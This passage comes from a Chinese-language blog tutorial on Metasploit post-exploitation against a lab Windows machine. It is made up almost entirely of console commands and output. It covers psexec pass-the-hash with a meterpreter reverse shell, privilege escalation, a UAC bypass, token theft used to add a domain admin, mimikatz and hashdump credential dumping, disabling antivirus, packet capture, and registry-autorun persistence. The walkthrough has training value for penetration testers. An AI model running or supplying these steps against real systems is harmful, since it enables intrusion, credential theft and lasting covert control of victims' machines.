show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/psexec):</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting  Required  Description</span><br><span class="line">   ----                  ---------------  --------  -----------</span><br><span class="line">   RHOST                                  yes       The target address</span><br><span class="line">   RPORT                 445              yes       The SMB service port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                    no        Service description to to be used on target <span class="keyword">for</span> pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                   no        The service display name</span><br><span class="line">   SERVICE_NAME                           no        The service name</span><br><span class="line">   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal <span class="built_in">read</span>/write folder share</span><br><span class="line">   SMBDomain             .                no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                                no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                                no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(windows/smb/psexec) &gt; <span class="built_in">set</span> rhost 192.168.1.187</span><br><span class="line">rhost =&gt; 192.168.1.187</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; <span class="built_in">set</span> lhost 192.168.1.130</span><br><span class="line">lhost =&gt; 192.168.1.130</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; <span class="built_in">set</span> lpost 4333</span><br><span class="line">lpost =&gt; 4333</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; <span class="built_in">set</span> SMBPass aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020</span><br><span class="line">SMBPass =&gt; aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; <span class="built_in">set</span> SMBUser Administrator</span><br><span class="line">SMBUser =&gt; Administrator</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; exploit</span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.230:1444 </span><br><span class="line">[*] 192.168.1.187:445 - Connecting to the server...</span><br><span class="line">[*] 192.168.1.187:445 - Authenticating to 192.168.1.187:445 as user <span class="string">'Administrator'</span>...</span><br><span class="line">[*] 192.168.1.187:445 - Selecting PowerShell target</span><br><span class="line">[*] 192.168.1.187:445 - Executing the payload...</span><br><span class="line">[+] 192.168.1.187:445 - Service start timed out, OK <span class="keyword">if</span> running a <span class="built_in">command</span> or non-service executable...</span><br><span class="line">[*] Sending stage (205891 bytes) to 192.168.1.187</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.230:1444 -&gt; 192.168.1.187:49468) at 2018-04-30 18:48:56 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use priv</span><br><span class="line">[-] The <span class="string">'priv'</span> extension has already been loaded.</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
<p>bypassuac</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; use exploit/windows/<span class="built_in">local</span>/bypassuac</span><br><span class="line">msf exploit(windows/<span class="built_in">local</span>/bypassuac) &gt; <span class="built_in">set</span> session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf exploit(windows/<span class="built_in">local</span>/bypassuac) &gt; exploit</span><br></pre></td></tr></table></figure>
<h2 id="令牌的假冒"><a href="#令牌的假冒" class="headerlink" title="令牌的假冒"></a>令牌的假冒</h2><p>1）incognito</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use incognito </span><br><span class="line">Loading extension incognito...Success.</span><br><span class="line">meterpreter &gt; list_tokens -u </span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">WIN-VONVJ6OMEQ7\Administrator</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure>
<p>2)ps 找到域管理员的pid参数(有时候不能看到）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;ps </span><br><span class="line">meterpreter &gt; steal_token pid号 <span class="comment">#盗取域管理员用户的令牌</span></span><br></pre></td></tr></table></figure>
<p>利用域管理员的令牌创建用户，并授予域管理员的权限<br>例子</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;impresonate_token SNEAKS.IN\\domianadmin</span><br><span class="line">meterpreter&gt;add_user qy qy -h 192.168.1.5 <span class="comment">#-h是域管理员添加账号的地址</span></span><br><span class="line">meterpreter&gt;add_group_user <span class="string">"Doamin Admins"</span> qy -h 192.168.1.5</span><br></pre></td></tr></table></figure>
<h2 id="通过跳板攻击其他主机"><a href="#通过跳板攻击其他主机" class="headerlink" title="通过跳板攻击其他主机"></a>通过跳板攻击其他主机</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets <span class="comment">#查看本地子网</span></span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: 192.168.1.0/255.255.255.0</span><br><span class="line"></span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line"></span><br><span class="line">msf exploit(windows/<span class="built_in">local</span>/bypassuac) &gt; route add 192.168.2.0 255.255.255.0 1 <span class="comment">#告诉系统将远程ID通过攻击会话1来进行路由</span></span><br><span class="line">[*] Route added</span><br><span class="line">msf exploit(windows/<span class="built_in">local</span>/bypassuac) &gt; route <span class="built_in">print</span> <span class="comment">#显示当前活跃的路由信息</span></span><br><span class="line"></span><br><span class="line">IPv4 Active Routing Table</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.2.0        255.255.255.0      Session 1</span><br></pre></td></tr></table></figure>
<h2 id="获取账户密码"><a href="#获取账户密码" class="headerlink" title="获取账户密码"></a>获取账户密码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID   Package    Domain        User              Password</span><br><span class="line">------   -------    ------        ----              --------</span><br><span class="line">0;996    Negotiate  WORKGROUP     WIN-VONVJ6OMEQ7$  </span><br><span class="line">0;46406  NTLM                                       </span><br><span class="line">0;997    Negotiate  NT AUTHORITY  LOCAL SERVICE     </span><br><span class="line">0;999    NTLM       WORKGROUP     WIN-VONVJ6OMEQ7$</span><br></pre></td></tr></table></figure>
<h2 id="脚本的使用"><a href="#脚本的使用" class="headerlink" title="脚本的使用"></a>脚本的使用</h2><p>1).vnc</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run vnc <span class="comment">#在远程系统上安装vnc会话</span></span><br><span class="line">[*] Creating a VNC reverse tcp stager: LHOST=192.168.1.230 LPORT=4545</span><br><span class="line">[*] Running payload handler</span><br><span class="line">[*] VNC stager executable 73802 bytes long</span><br><span class="line">[*] Uploaded the VNC agent to C:\Windows\TEMP\jzoEGmzImp.exe (must be deleted manually)</span><br><span class="line">[*] Executing the VNC agent with endpoint 192.168.1.230:4545...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run screen_unlock <span class="comment"># 对目标机器上的桌面进行解锁</span></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/escalate/screen_unlock.</span><br><span class="line">[!] Example: run post/windows/escalate/screen_unlock OPTION=value [...]</span><br><span class="line">[*] no working target found</span><br></pre></td></tr></table></figure>
<p>2).查看系统安装的软件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_applications</span><br><span class="line"></span><br><span class="line">[*] Enumerating applications installed on WIN-VONVJ6OMEQ7</span><br><span class="line"></span><br><span class="line">Installed Applications</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line"> Name                                                            Version</span><br><span class="line"> ----                                                            -------</span><br><span class="line"> 2345好压                                                          v5.9</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161  9.0.30729.6161</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161  9.0.30729.6161</span><br><span class="line"> Microsoft Visual C++ 2015 Redistributable (x64) - 14.0.24215    14.0.24215.1</span><br><span class="line"> Microsoft Visual C++ 2015 x64 Additional Runtime - 14.0.24215   14.0.24215</span><br><span class="line"> Microsoft Visual C++ 2015 x64 Minimum Runtime - 14.0.24215      14.0.24215</span><br><span class="line"> Python 2.7.13 (64-bit)                                          2.7.13150</span><br><span class="line"> VMware Tools                                                    10.2.0.7259539</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Results stored <span class="keyword">in</span>: /root/.msf4/loot/20180501054603_default_192.168.1.187_host.application_930049.txt</span><br></pre></td></tr></table></figure>
<p>3)迁移到稳定的进程</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 1128</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run post/windows/manage/migrate</span><br><span class="line">[*] Running module against WIN-VONVJ6OMEQ7</span><br><span class="line">[*] Current server process: spoolsv.exe (1128)</span><br><span class="line">[*] Spawning notepad.exe process to migrate to</span><br><span class="line">[+] Migrating to 3592</span><br><span class="line">[+] Successfully migrated to process 3592</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 3592</span><br></pre></td></tr></table></figure>
<p>4)关闭杀毒软件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run killav</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/killav.</span><br><span class="line">[!] Example: run post/windows/manage/killav OPTION=value [...]</span><br><span class="line">[*] Killing Antivirus services on the target...</span><br></pre></td></tr></table></figure>
<p>5)查看目标机上的所有来流量</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run packetrecorder -i 1</span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/rpcapd_start.</span><br><span class="line">[!] Example: run post/windows/manage/rpcapd_start OPTION=value [...]</span><br><span class="line">[*] Starting Packet capture on interface 1</span><br><span class="line">[+] Packet capture started</span><br><span class="line">[*] Packets being saved <span class="keyword">in</span> to /root/.msf4/logs/scripts/packetrecorder/WIN-VONVJ6OMEQ7_20180501.0138/WIN-VONVJ6OMEQ7_20180501.0138.cap</span><br><span class="line">[*] Packet capture interval is 30 Seconds</span><br></pre></td></tr></table></figure>
<p>6)得到目标主机系统用户的哈希值</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 24a05299b237d9f48c9eff1c6a88a57e...</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">No users with password hints on this system</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
<p>7)得到详细的系统信息<br>用户名和密码、下载全部注册表、挖掘密码哈希值和收集系统信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run scraper</span><br><span class="line">[*] New session on 192.168.1.187:445...</span><br><span class="line">[*] Gathering basic system information...</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Obtaining the entire registry...</span><br><span class="line">[*]  Exporting HKCU</span><br><span class="line">[*]  Downloading HKCU (C:\Windows\TEMP\JKaHEoEs.reg)</span><br><span class="line">[*]  Cleaning HKCU</span><br><span class="line">[*]  Exporting HKLM</span><br><span class="line">[*]  Downloading HKLM (C:\Windows\TEMP\qCMsnidu.reg)</span><br><span class="line">[*]  Cleaning HKLM</span><br><span class="line">[*]  Exporting HKCC</span><br><span class="line">[*]  Downloading HKCC (C:\Windows\TEMP\PTbboPFX.reg)</span><br><span class="line">[*]  Cleaning HKCC</span><br><span class="line">[*]  Exporting HKCR</span><br><span class="line">[*]  Downloading HKCR (C:\Windows\TEMP\AQMWnvZo.reg)</span><br><span class="line">[*]  Cleaning HKCR</span><br><span class="line">[*]  Exporting HKU</span><br><span class="line">[*]  Downloading HKU (C:\Windows\TEMP\XNLnHUgE.reg)</span><br><span class="line">[*]  Cleaning HKU</span><br><span class="line">[*] Completed processing on 192.168.1.187:445...</span><br></pre></td></tr></table></figure>
<p>8）控制持久化<br>-X 开机自启动，-i 40每40秒重连一次 -p指定端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run persistence -X -i 40 -p 443 -r 192.168.1.187 </span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file <span class="keyword">for</span> cleanup created at /root/.msf4/logs/persistence/WIN-VONVJ6OMEQ7_20180501.2631/WIN-VONVJ6OMEQ7_20180501.2631.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=443</span><br><span class="line">[*] Persistent agent script is 99671 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Windows\TEMP\ManzZNr.vbs</span><br><span class="line">[*] Executing script C:\Windows\TEMP\ManzZNr.vbs</span><br><span class="line">[+] Agent executed with PID 3852</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\KHNDPfTiTa</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\KHNDPfTiTa</span><br><span class="line">开始连接</span><br><span class="line"></span><br><span class="line">msf &gt; use multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.1.187</span><br><span class="line">lhost =&gt; 192.168.1.187</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lport 443</span><br><span class="line">lport =&gt; 443</span><br><span class="line">msf exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>
<p>8）列出所有后渗透模块</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run post/ 后，按tab见</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run post/</span><br><span class="line">Display all 207 possibilities? (y or n)</span><br></pre></td></tr></table></figure>
<p>参考文章:<br><a href="https://www.cnblogs.com/dogecheng/p/11450423.html" target="_blank" rel="noopener">MSF——基本使用和Exploit模块（一）</a></p>
</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ye1s</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://blog.cfyqy.com/article/ed21da3c.html">https://blog.cfyqy.com/article/ed21da3c.html</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.cfyqy.com">ye1s</a>！</span></div></div><div class="post-copyright" id="comments-container"><script src="/js/comments/gitment.js"></script></div><script>let arr = location.href.split('/#more')[0].split('/');
let title = arr[arr.length - 1];
if (title === '') {
    title = arr[arr.length - 2]
}
var flag = false;
var gitFun = function () {
    try {
        var gitmentObj = window.GLOBAL_CONFIG.gitment;
        var gitment = new Gitment({
            id: decodeURI(title), // 可选。默认为 location.href
            owner: gitmentObj.owner,
            repo: gitmentObj.repo,
            oauth: {
                client_id: gitmentObj.client_id,
                client_secret: gitmentObj.client_secret
            },
        });
        gitment.render('comments-container');
        flag = true;
    } catch (e) {
        flag = false;
    }
}
var setIn = setInterval(() => {
    if (!flag) {
        gitFun();
    } else {
        clearInterval(setIn);
    }
}, 200);</script></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/6533f0b0.html"><i class="fas fa-angle-left">&nbsp;</i><span>Mimikatz 浅识</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/9b9a2941.html"><span>PGP加密学习</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2017 ～ 2021 By ye1s</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/daovoice.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>